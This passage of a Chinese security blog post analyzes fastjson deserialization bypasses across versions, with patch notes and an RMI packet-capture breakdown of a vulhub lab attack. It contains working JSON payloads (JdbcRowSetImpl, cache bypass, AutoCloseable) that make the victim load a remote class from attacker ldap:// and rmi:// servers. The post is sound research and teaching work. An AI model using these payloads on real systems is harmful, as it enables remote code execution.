class="line">    <span class="keyword">private</span> int age=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">String</span> username=<span class="string">&quot;init&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> Properties secret= <span class="keyword">new</span> Properties( );</span><br><span class="line">    <span class="keyword">public</span> int <span class="function"><span class="title">getAge</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge called&quot;</span>);<span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="function"><span class="title">setAge</span>(<span class="params">int age</span>)</span> &#123; age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">String</span> <span class="function"><span class="title">getUsername</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getUsername called&quot;</span>);<span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="function"><span class="title">setUsername</span>(<span class="params"><span class="built_in">String</span> username</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Properties <span class="function"><span class="title">getSecret</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getSecret called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> secret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">String</span> <span class="function"><span class="title">toString</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age + <span class="string">&quot;,&quot;</span> + <span class="built_in">this</span>.username + <span class="string">&quot;,&quot;</span> + <span class="built_in">this</span>.secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="lt-1-2-24"><a href="#lt-1-2-24" class="headerlink" title="&lt;= 1.2.24"></a>&lt;= 1.2.24</h3><p>换了 1.2.24 版本，继续分析。</p>
<h4 id="TemplatesImpl-Gadget"><a href="#TemplatesImpl-Gadget" class="headerlink" title="TemplatesImpl Gadget"></a>TemplatesImpl Gadget</h4><p>这就是上面复现过程中使用的 gadget，利用条件比较苛刻，需要服务端开启 <code>Feature.SupportNonPublicField</code>。这个 TemplatesImpl 也是反序列化中常用的利用链。在 fastjson 中能够利用成功关键在于能够调用 <code>getOutPutProperties</code>方法</p>
<p><img src="/2021/07/20/fastjson/image-20210811145335888.png" alt="image-20210811145335888"></p>
<p>这个类中存在 <code>_outputProperties</code> 这个字段和 <code>getOuputProperties</code> getter，但是不存在 setter。同事返回值的类型是 Properties，它继承了 HashMap，间接继承了 Map。满足了所需的要求，所以可以调用。</p>
<h4 id="JDBC-Gadget"><a href="#JDBC-Gadget" class="headerlink" title="JDBC Gadget"></a>JDBC Gadget</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://192.168.183.1:389/obj&quot;</span>,<span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>本质上是一个 JNDI 注入，获取到的 autoCommit 方法造成 JNDI 注入</p>
<p><img src="/2021/07/20/fastjson/image-20210812151144620.png" alt="image-20210812151144620"></p>
<p>connect 方法中调用 lookup，造成 JNDI 注入</p>
<p><img src="/2021/07/20/fastjson/image-20210812151323801.png" alt="image-20210812151323801"></p>
<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>默认关闭了 AutoType，并且加入了黑白名单机制。</p>
<p>1.2.23 中的相关部分：</p>
<p><img src="/2021/07/20/fastjson/image-20210807174626906.png" alt="image-20210807174626906"></p>
<p>322 行的 loadClass，在 1.2.25 中改为了 checkAutoType</p>
<p><img src="/2021/07/20/fastjson/image-20210813115855160.png" alt="image-20210813115855160"></p>
<p>在 AutoType 打开或者指定了 expectClass 的情况下，指定的 TypeName 如果在百名单中，则直接 loadClass，黑名单中抛出错误。</p>
<p><img src="/2021/07/20/fastjson/image-20210813120302429.png" alt="image-20210813120302429"></p>
<h4 id="loadClass-绕过"><a href="#loadClass-绕过" class="headerlink" title="loadClass 绕过"></a>loadClass 绕过</h4><p>在 AutoType 被手动打开的情况下，可以通过 loadClass 的截断特性绕过黑名单。</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Lcom.sun.<span class="comment">; =&gt; com.sun.</span></span><br><span class="line">[<span class="keyword">com</span>.sun.  =&gt; <span class="keyword">com</span>.sun.</span><br></pre></td></tr></table></figure>

<p>1.2.42 中检查是否以<code>L</code>开头以<code>;</code>结尾，是则截断第一个和最后一个字符。所以可以双写绕过。<code>LLcom.sun.;;</code>。后续修复检查是否以<code>L</code>开头以<code>;</code>结尾，此时可以使用<code>L</code>绕过。最后修复了<code>L</code>，无法绕过。</p>
<h3 id="lt-1-2-47"><a href="#lt-1-2-47" class="headerlink" title="&lt;=1.2.47"></a>&lt;=1.2.47</h3><h4 id="缓存绕过"><a href="#缓存绕过" class="headerlink" title="缓存绕过"></a>缓存绕过</h4><p>无需开启 Autotype 即可 RCE</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[&#123;</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125; ]</span><br></pre></td></tr></table></figure>

<p>不开启 autotype 的情况下，解析 java.lang.class 的时候不会进入下图中的第一个判断</p>
<p><img src="/2021/07/20/fastjson/image-20210813120302429.png" alt="image-20210813120302429"></p>
<p>而是直接返回 java.lang.class</p>
<p><img src="/2021/07/20/fastjson/image-20210813142747842.png" alt="image-20210813142747842"></p>
<p>随后获取 Class 对应的 Deserializer，是 Misccodec</p>
<p><img src="/2021/07/20/fastjson/image-20210813142951233.png" alt="image-20210813142951233"></p>
<p>在 deserialize 方法中，解析了 objVal 的值，即<code>JdbcRowSetImpl</code></p>
<p><img src="/2021/07/20/fastjson/image-20210813143551170.png" alt="image-20210813143551170"></p>
<p>然后进行了 loadClass,，此处的 strVal 为 <code>(String)objVal</code></p>
<p><img src="/2021/07/20/fastjson/image-20210813143702077.png" alt="image-20210813143702077"></p>
<p>FastJSON 有缓存机制，每次 deserialize 获取到的 value 会存放在一个 map 中。</p>
<p>在解析数组的第二项即<code>JdbcRowSetImpl</code>时，在 getFromMapping 中会获取到 FastJSON 的缓存，即 JdbcRowSetImpl，直接返回了该类，从而绕过了 checkAutotype</p>
<p><img src="/2021/07/20/fastjson/image-20210813142747842.png" alt="image-20210813142747842"></p>
<p>随后的修复默认关闭了缓存，这样就无法绕过 checkAutotype 了。</p>
<h3 id="lt-1-2-68"><a href="#lt-1-2-68" class="headerlink" title="&lt;= 1.2.68"></a>&lt;= 1.2.68</h3><h4 id="AutoCloseable-绕过"><a href="#AutoCloseable-绕过" class="headerlink" title="AutoCloseable 绕过"></a>AutoCloseable 绕过</h4><p>1.2.68，有限制，需要已知存在问题并且实现了 AutoCloseable 的类</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;class.to.be.deserialized&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/20/fastjson/image-20210813224605958.png" alt="image-20210813224605958"></p>
<p>重点在于 expectClassFlag，当第一次进入 checckAutotype 时，改变了 expectClass，当第二个类为第一个类的子类时，判断 expectClass 成功，会进行 loadClass。但是条件比较苛刻，要求服务器上存在危险的类才能利用，总体来说难度较大。</p>
<p>随后的修复中，将<code>java.lang.AutoCloseable</code>，<code>java.lang.Readable</code>，<code>java.lang.Runnable</code>加入黑名单.</p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用 vulhub 的环境和 JNDI 注入的 payload 攻击，用 marshalsec 开启 JNDI 服务并使受害者加载远程恶意类，192.168.183.1 为攻击者，192.168.183.128 为受害者，远程类 TouchFile 存放在 192.168.183.1:8080，抓包分析，<a href="FastJSONRMI.pcapng">数据包</a>，[RMI文档](<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html#overview">Java Remote Method Invocation: 10 - RMI Wire Protocol (oracle.com)</a>)</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;b&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://192.168.183.1:9999/TouchFile&quot;</span>,<span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;,<span class="attr">&quot;ixukxrkli7g&quot;</span>:<span class="string">&quot;=&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>RMI 过程中，会建立两个连接，Client - RMI Registry 和 Client - RMI Server。</p>
<h3 id="Client-RMI-Registry"><a href="#Client-RMI-Registry" class="headerlink" title="Client - RMI Registry"></a>Client - RMI Registry</h3><p><code>192.168.183.128:35656 --- 192.168.183.1:9999</code>(tcp.stream eq 2)</p>
<ol>
<li>客户端连接 RMI Registry</li>
</ol>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0000 </span>  <span class="number">4</span>a <span class="number">52</span> <span class="number">4</span>d <span class="number">49</span> <span class="number">00</span> <span class="number">02</span> <span class="number">4</span>b                              JRMI..K</span><br></pre></td></tr></table></figure>

<p>根据文档</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">Header</span></span>:</span><br><span class="line">	<span class="attribute">0x4a</span> <span class="number">0</span>x<span class="number">52</span> <span class="number">0</span>x<span class="number">4</span>d <span class="number">0</span>x<span class="number">49</span> Version Protocol</span><br><span class="line">	<span class="attribute">Version</span>:</span><br><span class="line">		<span class="attribute">0x00</span> <span class="number">0</span>x<span class="number">01</span></span><br><span class="line">	<span class="attribute">Protocol</span>:</span><br><span class="line">		<span class="attribute">StreamProtocol</span></span><br><span class="line">		<span class="attribute">SingleOpProtocol</span></span><br><span class="line">        <span class="attribute">MultiplexProtocol</span></span><br><span class="line">            <span class="attribute">StreamProtocol</span>:</span><br><span class="line">            	<span class="attribute">0x4b</span></span><br><span class="line">            <span class="attribute">SingleOpProtocol</span>:</span><br><span class="line">            	<span class="attribute">0x4c</span></span><br><span class="line">            <span class="attribute">MultiplexProtocol</span>:</span><br><span class="line">           	 	<span class="attribute">0x4d</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>RMI Registry 返回客户端信息</li>
</ol>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0000</span>   <span class="number">4</span>e <span class="number">00</span> <span class="number">0</span>f <span class="number">31</span> <span class="number">39</span> <span class="number">32</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">36</span> <span class="number">38</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">38</span> <span class="number">33</span> <span class="number">2</span>e <span class="number">31</span>   N..<span class="number">192.168.183.1</span></span><br><span class="line"><span class="attribute">0010</span>   <span class="number">32</span> <span class="number">38</span> <span class="number">00</span> <span class="number">00</span> <span class="number">8</span>b <span class="number">48</span>                                 <span class="number">28</span>...H</span><br></pre></td></tr></table></figure>

<p>0x4e 为 ProtocolAck。0x000f 表示后续 IP 地址长度为 15 字节，即 ASCII 编码的<code>192.168.183.1</code>。0x0000 保留。0x8b48 表示 35656 端口。</p>
<p>可以看出返回的是客户端的信息。</p>
<ol start="3">
<li> 客户端返回自己的内网地址</li>
</ol>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0000</span>   <span class="number">00</span> <span class="number">0</span>a <span class="number">31</span> <span class="number">37</span> <span class="number">32</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">38</span> <span class="number">2</span>e <span class="number">30</span> <span class="number">2</span>e <span class="number">32</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   ..<span class="number">172.18.0.2</span>....</span><br></pre></td></tr></table></figure>

<p>同上，0x000a 表示长度为 10 的 IP 地址，末尾 0x0000 保留。</p>
<ol start="4">
<li>客户端向 RMI Registry 发送 Call</li>
</ol>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000  <span class="number"> 50 </span>ac ed<span class="number"> 00 </span>05<span class="number"> 77 </span>22<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>  P....w&quot;.........</span><br><span class="line">0010  <span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00   ................</span><br><span class="line">0020  <span class="number"> 02 </span>44<span class="number"> 15 </span>4d c9 d4 e6 3b df<span class="number"> 74 </span>00<span class="number"> 09 </span>54 6f<span class="number"> 75 </span>63   .D.M...;.t..Touc</span><br><span class="line">0030  <span class="number"> 68 </span>46<span class="number"> 69 </span>6c<span class="number"> 65 </span>                                   hFile</span><br></pre></td></tr></table></figure>

<p>0x50 表示 JRMP Call，后面的以 0xaced 开头的是 Serialization Data，可以看到，结尾是客户端要加载的远程类 TouchFile</p>
<ol start="5">
<li>RMI Registry 返回客户端调用远程方法需要的信息</li>
</ol>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0000</span>   <span class="number">51</span> ac ed <span class="number">00</span> <span class="number">05</span> <span class="number">77</span> <span class="number">0</span>f <span class="number">01</span> <span class="number">0</span>f <span class="number">54</span> <span class="number">56</span> ae <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">7</span>b   Q....w...TV....&#123;</span><br><span class="line"><span class="attribute">0010</span>   <span class="number">5</span>c <span class="number">81</span> <span class="number">9</span>c <span class="number">8</span>b <span class="number">80</span> <span class="number">01</span> <span class="number">73</span> <span class="number">72</span> <span class="number">00</span> <span class="number">2</span>a <span class="number">63</span> <span class="number">6</span>f <span class="number">6</span>d <span class="number">2</span>e <span class="number">73</span> <span class="number">75</span>   \.....sr.*com.su</span><br><span class="line"><span class="attribute">0020</span>   <span class="number">6</span>e <span class="number">2</span>e <span class="number">6</span>a <span class="number">6</span>e <span class="number">64</span> <span class="number">69</span> <span class="number">2</span>e <span class="number">72</span> <span class="number">6</span>d <span class="number">69</span> <span class="number">2</span>e <span class="number">72</span> <span class="number">65</span> <span class="number">67</span> <span class="number">69</span> <span class="number">73</span>   n.jndi.rmi.regis</span><br><span class="line"><span class="attribute">0030</span>   <span class="number">74</span> <span class="number">72</span> <span class="number">79</span> <span class="number">2</span>e <span class="number">52</span> <span class="number">65</span> <span class="number">66</span> <span class="number">65</span> <span class="number">72</span> <span class="number">65</span> <span class="number">6</span>e <span class="number">63</span> <span class="number">65</span> <span class="number">57</span> <span class="number">72</span> <span class="number">61</span>   try.ReferenceWra</span><br><span class="line"><span class="attribute">0040</span>   <span class="number">70</span> <span class="number">70</span> <span class="number">65</span> <span class="number">72</span> <span class="number">54</span> <span class="number">5</span>a <span class="number">0</span>e <span class="number">24</span> <span class="number">97</span> c<span class="number">2</span> c<span class="number">5</span> f<span class="number">0</span> <span class="number">02</span> <span class="number">00</span> <span class="number">01</span> <span class="number">4</span>c   pperTZ.$.......L</span><br><span class="line"><span class="attribute">0050</span>   <span class="number">00</span> <span class="number">07</span> <span class="number">77</span> <span class="number">72</span> <span class="number">61</span> <span class="number">70</span> <span class="number">70</span> <span class="number">65</span> <span class="number">65</span> <span class="number">74</span> <span class="number">00</span> <span class="number">18</span> <span class="number">4</span>c <span class="number">6</span>a <span class="number">61</span> <span class="number">76</span>   ..wrappeet..Ljav</span><br><span class="line"><span class="attribute">0060</span>   <span class="number">61</span> <span class="number">78</span> <span class="number">2</span>f <span class="number">6</span>e <span class="number">61</span> <span class="number">6</span>d <span class="number">69</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">2</span>f <span class="number">52</span> <span class="number">65</span> <span class="number">66</span> <span class="number">65</span> <span class="number">72</span> <span class="number">65</span>   ax/naming/Refere</span><br><span class="line"><span class="attribute">0070</span>   <span class="number">6</span>e <span class="number">63</span> <span class="number">65</span> <span class="number">3</span>b <span class="number">74</span> <span class="number">00</span> <span class="number">24</span> <span class="number">68</span> <span class="number">74</span> <span class="number">74</span> <span class="number">70</span> <span class="number">3</span>a <span class="number">2</span>f <span class="number">2</span>f <span class="number">31</span> <span class="number">39</span>   nce;t.$http://<span class="number">19</span></span><br><span class="line"><span class="attribute">0080</span>   <span class="number">32</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">36</span> <span class="number">38</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">38</span> <span class="number">33</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">3</span>a <span class="number">38</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span>   <span class="number">2.168.183.1:8000</span></span><br><span class="line"><span class="attribute">0090</span>   <span class="number">2</span>f <span class="number">23</span> <span class="number">54</span> <span class="number">6</span>f <span class="number">75</span> <span class="number">63</span> <span class="number">68</span> <span class="number">46</span> <span class="number">69</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">78</span> <span class="number">72</span> <span class="number">00</span> <span class="number">23</span> <span class="number">6</span>a   /#TouchFilexr.#j</span><br><span class="line"><span class="attribute">00a0</span>   <span class="number">61</span> <span class="number">76</span> <span class="number">61</span> <span class="number">2</span>e <span class="number">72</span> <span class="number">6</span>d <span class="number">69</span> <span class="number">2</span>e <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">76</span> <span class="number">65</span> <span class="number">72</span> <span class="number">2</span>e <span class="number">55</span>   ava.rmi.server.U</span><br><span class="line"><span class="attribute">00b0</span>   <span class="number">6</span>e <span class="number">69</span> <span class="number">63</span> <span class="number">61</span> <span class="number">73</span> <span class="number">74</span> <span class="number">52</span> <span class="number">65</span> <span class="number">6</span>d <span class="number">6</span>f <span class="number">74</span> <span class="number">65</span> <span class="number">4</span>f <span class="number">62</span> <span class="number">6</span>a <span class="number">65</span>   nicastRemoteObje</span><br><span class="line"><span class="attribute">00c0</span>   <span class="number">63</span> <span class="number">74</span> <span class="number">45</span> <span class="number">09</span> <span class="number">12</span> <span class="number">15</span> f<span class="number">5</span> e<span class="number">2</span> <span class="number">7</span>e <span class="number">31</span> <span class="number">02</span> <span class="number">00</span> <span class="number">03</span> <span class="number">49</span> <span class="number">00</span> <span class="number">04</span>   ctE.....~<span class="number">1</span>...I..</span><br><span class="line"><span class="attribute">00d0</span>   <span class="number">70</span> <span class="number">6</span>f <span class="number">72</span> <span class="number">74</span> <span class="number">4</span>c <span class="number">00</span> <span class="number">03</span> <span class="number">63</span> <span class="number">73</span> <span class="number">66</span> <span class="number">74</span> <span class="number">00</span> <span class="number">28</span> <span class="number">4</span>c <span class="number">6</span>a <span class="number">61</span>   portL..csft.(Lja</span><br><span class="line"><span class="attribute">00e0</span>   <span class="number">76</span> <span class="number">61</span> <span class="number">2</span>f <span class="number">72</span> <span class="number">6</span>d <span class="number">69</span> <span class="number">2</span>f <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">76</span> <span class="number">65</span> <span class="number">72</span> <span class="number">2</span>f <span class="number">52</span> <span class="number">4</span>d   va/rmi/server/RM</span><br><span class="line"><span class="attribute">00f0</span>   <span class="number">49</span> <span class="number">43</span> <span class="number">6</span>c <span class="number">69</span> <span class="number">65</span> <span class="number">6</span>e <span class="number">74</span> <span class="number">53</span> <span class="number">6</span>f <span class="number">63</span> <span class="number">6</span>b <span class="number">65</span> <span class="number">74</span> <span class="number">46</span> <span class="number">61</span> <span class="number">63</span>   IClientSocketFac</span><br><span class="line"><span class="attribute">0100</span>   <span class="number">74</span> <span class="number">6</span>f <span class="number">72</span> <span class="number">79</span> <span class="number">3</span>b <span class="number">4</span>c <span class="number">00</span> <span class="number">03</span> <span class="number">73</span> <span class="number">73</span> <span class="number">66</span> <span class="number">74</span> <span class="number">00</span> <span class="number">28</span> <span class="number">4</span>c <span class="number">6</span>a   tory;L..ssft.(Lj</span><br><span class="line"><span class="attribute">0110</span>   <span class="number">61</span> <span class="number">76</span> <span class="number">61</span> <span class="number">2</span>f <span class="number">72</span> <span class="number">6</span>d <span class="number">69</span> <span class="number">2</span>f <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">76</span> <span class="number">65</span> <span class="number">72</span> <span class="number">2</span>f <span class="number">52</span>   ava/rmi/server/R</span><br><span class="line"><span class="attribute">0120</span>   <span class="number">4</span>d <span class="number">49</span> <span class="number">53</span> <span class="number">65</span> <span class="number">72</span> <span class="number">76</span> <span class="number">65</span> <span class="number">72</span> <span class="number">53</span> <span class="number">6</span>f <span class="number">63</span> <span class="number">6</span>b <span class="number">65</span> <span class="number">74</span> <span class="number">46</span> <span class="number">61</span>   MIServerSocketFa</span><br><span class="line"><span class="attribute">0130</span>   <span class="number">63</span> <span class="number">74</span> <span class="number">6</span>f <span class="number">72</span> <span class="number">79</span> <span class="number">3</span>b <span class="number">74</span> <span class="number">00</span> <span class="number">24</span> <span class="number">68</span> <span class="number">74</span> <span class="number">74</span> <span class="number">70</span> <span class="number">3</span>a <span class="number">2</span>f <span class="number">2</span>f   ctory;t.$http://</span><br><span class="line"><span class="attribute">0140</span>   <span class="number">31</span> <span class="number">39</span> <span class="number">32</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">36</span> <span class="number">38</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">38</span> <span class="number">33</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">3</span>a <span class="number">38</span> <span class="number">30</span>   <span class="number">192.168.183.1:80</span></span><br><span class="line"><span class="attribute">0150</span>   <span class="number">30</span> <span class="number">30</span> <span class="number">2</span>f <span class="number">23</span> <span class="number">54</span> <span class="number">6</span>f <span class="number">75</span> <span class="number">63</span> <span class="number">68</span> <span class="number">46</span> <span class="number">69</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">78</span> <span class="number">72</span> <span class="number">00</span>   <span class="number">00</span>/#TouchFilexr.</span><br><span class="line"><span class="attribute">0160</span>   <span class="number">1</span>c <span class="number">6</span>a <span class="number">61</span> <span class="number">76</span> <span class="number">61</span> <span class="number">2</span>e <span class="number">72</span> <span class="number">6</span>d <span class="number">69</span> <span class="number">2</span>e <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">76</span> <span class="number">65</span> <span class="number">72</span>   .java.rmi.server</span><br><span class="line"><span class="attribute">0170</span>   <span class="number">2</span>e <span class="number">52</span> <span class="number">65</span> <span class="number">6</span>d <span class="number">6</span>f <span class="number">74</span> <span class="number">65</span> <span class="number">53</span> <span class="number">65</span> <span class="number">72</span> <span class="number">76</span> <span class="number">65</span> <span class="number">72</span> c<span class="number">7</span> <span class="number">19</span> <span class="number">07</span>   .RemoteServer...</span><br><span class="line"><span class="attribute">0180</span>   <span class="number">12</span> <span class="number">68</span> f<span class="number">3</span> <span class="number">39</span> fb <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">74</span> <span class="number">00</span> <span class="number">24</span> <span class="number">68</span> <span class="number">74</span> <span class="number">74</span> <span class="number">70</span> <span class="number">3</span>a   .h.<span class="number">9</span>....t.$http:</span><br><span class="line"><span class="attribute">0190</span>   <span class="number">2</span>f <span class="number">2</span>f <span class="number">31</span> <span class="number">39</span> <span class="number">32</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">36</span> <span class="number">38</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">38</span> <span class="number">33</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">3</span>a   //<span class="number">192.168.183.1</span>:</span><br><span class="line"><span class="attribute">01a0</span>   <span class="number">38</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">2</span>f <span class="number">23</span> <span class="number">54</span> <span class="number">6</span>f <span class="number">75</span> <span class="number">63</span> <span class="number">68</span> <span class="number">46</span> <span class="number">69</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">78</span>   <span class="number">8000</span>/#TouchFilex</span><br><span class="line"><span class="attribute">01b0</span>   <span class="number">72</span> <span class="number">00</span> <span class="number">1</span>c <span class="number">6</span>a <span class="number">61</span> <span class="number">76</span> <span class="number">61</span> <span class="number">2</span>e <span class="number">72</span> <span class="number">6</span>d <span class="number">69</span> <span class="number">2</span>e <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">76</span>   r..java.rmi.serv</span><br><span class="line"><span class="attribute">01c0</span>   <span class="number">65</span> <span class="number">72</span> <span class="number">2</span>e <span class="number">52</span> <span class="number">65</span> <span class="number">6</span>d <span class="number">6</span>f <span class="number">74</span> <span class="number">65</span> <span class="number">4</span>f <span class="number">62</span> <span class="number">6</span>a <span class="number">65</span> <span class="number">63</span> <span class="number">74</span> d<span class="number">3</span>   er.RemoteObject.</span><br><span class="line"><span class="attribute">01d0</span>   <span class="number">61</span> b<span class="number">4</span> <span class="number">91</span> <span class="number">0</span>c <span class="number">61</span> <span class="number">33</span> <span class="number">1</span>e <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">74</span> <span class="number">00</span> <span class="number">24</span> <span class="number">68</span> <span class="number">74</span> <span class="number">74</span>   a...a<span class="number">3</span>....t.$htt</span><br><span class="line"><span class="attribute">01e0</span>   <span class="number">70</span> <span class="number">3</span>a <span class="number">2</span>f <span class="number">2</span>f <span class="number">31</span> <span class="number">39</span> <span class="number">32</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">36</span> <span class="number">38</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">38</span> <span class="number">33</span> <span class="number">2</span>e   p://<span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.</span><br><span class="line"><span class="attribute">01f0</span>   <span class="number">31</span> <span class="number">3</span>a <span class="number">38</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">2</span>f <span class="number">23</span> <span class="number">54</span> <span class="number">6</span>f <span class="number">75</span> <span class="number">63</span> <span class="number">68</span> <span class="number">46</span> <span class="number">69</span> <span class="number">6</span>c   <span 